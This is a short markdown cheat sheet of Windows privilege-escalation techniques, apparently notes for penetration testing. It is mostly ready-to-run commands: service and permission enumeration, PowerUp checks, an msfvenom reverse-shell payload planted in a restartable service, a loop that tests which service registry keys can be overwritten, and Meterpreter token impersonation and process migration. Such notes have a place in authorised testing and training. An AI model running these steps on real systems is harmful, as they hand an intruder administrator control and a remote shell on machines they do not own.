# Windows Privilege Escalation
## Enumeration
- List installed products
```cmd
wmic product
wmic product get name,version,vendor
```
- List services
```cmd
wmic service list brief
get-service
wmic service list brief | findstr  "Running"
```

## Misconfiguration
- List unquoted services
```
wmic service get name,displayname,pathname,startmode
get-wmiobject win32_service | select name,pathname
```
- Find writable folders
```
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
```
- DLL Hijacking
- Privileges

## PowerUp.ps1
- Dot source the script and launch checks
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```
- Look for CanRestart=True and modifiable executable services
- Generate an exe payload with MSFVenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -e x86/shikata_ga_nai -f exe -o file.exe
```
- Upload the payload and restart the service to get root shell

## Services misconfiguration
- list services image path
```cmd
reg query hklm\System\CurrentControlSet\Services /s /v imagepath
```
- try to write to every paths
```
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a
```

## Token Impersonation
- check current user's privileges
```
whoami /priv
```
- Look for abusable privileges
```
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege
```

### Search for local exploit using Metasploit
```sh
use post/multi/recon/local_exploit_suggester
```

### Meterpreter Incognito module
```sh
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrator"
# Search for a process running under the same account that has been impersonated
ps
migrate pid
```

## Links
___
### Guides
- https://lolbas-project.github.io/
